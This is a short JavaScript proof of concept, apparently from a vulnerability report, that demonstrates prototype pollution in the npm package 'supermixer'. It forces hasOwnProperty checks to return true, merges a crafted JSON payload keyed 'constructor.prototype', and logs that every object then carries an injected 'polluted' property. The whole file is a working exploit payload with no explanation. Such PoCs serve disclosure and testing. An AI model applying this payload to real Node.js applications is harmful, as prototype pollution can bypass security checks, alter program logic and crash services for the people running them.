Object.prototype.hasOwnProperty.call = () => true;
var mixer = require('supermixer');
obj = {};
console.log({}.polluted);
var payload = '{"constructor.prototype": {"polluted":"yes"}}';
mixer.merge({}, JSON.parse(payload));
console.log({}.polluted);